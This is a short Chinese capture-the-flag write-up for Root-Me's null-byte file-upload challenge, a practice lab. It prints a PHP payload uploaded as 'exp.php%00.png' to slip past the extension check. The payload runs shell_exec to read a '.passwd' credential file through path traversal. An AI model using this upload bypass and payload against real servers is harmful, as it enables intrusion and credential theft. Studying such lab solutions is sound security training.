## [[Root-Me](https://www.root-me.org/)] [[Web-Server](https://www.root-me.org/en/Challenges/Web-Server/)] [[File upload - null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte)] [[解题报告](http://exp-blog.com/2019/01/14/pid-2995/)]

------

这题和【[Web-Server : File upload - double extensions](http://exp-blog.com/2019/01/13/pid-2985/)】、【[Web-Server : File upload - MIME type](http://exp-blog.com/2019/01/13/pid-2987/)】的渗透思路是一样的，区别在于之前的两种绕过方式均被封锁了。

这次提示的绕过方式是空字节漏洞 null byte ，依然在文件名上做文章，构造 payloads 文件 `exp.php%00.png`：

```php
<?php
	// exp.php%00.png
	// 假如这个文件上传成功，则可以利用 web 打开这个文件进行解析时进行路径穿越
	$content = shell_exec('cat ../../../.passwd');
	echo "<pre>$content</pre>";
?>
```

此文件名在上传时，可以在前端后缀欺骗，而后端在读取时遇到 `%00` 空字节会截断后面部分。

上传成功后获得 `exp.php%00.png` 文件的完整 URI，手工去掉末尾的 `%00.png` 后拼接到 URL，即可获得密码，完成挑战。


![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B18%5D%20%5B25P%5D%20File%20upload%20-%20null%20byte/imgs/01.png)

------

## 版权声明

　[![Copyright (C) EXP,2016](https://img.shields.io/badge/Copyright%20(C)-EXP%202016-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
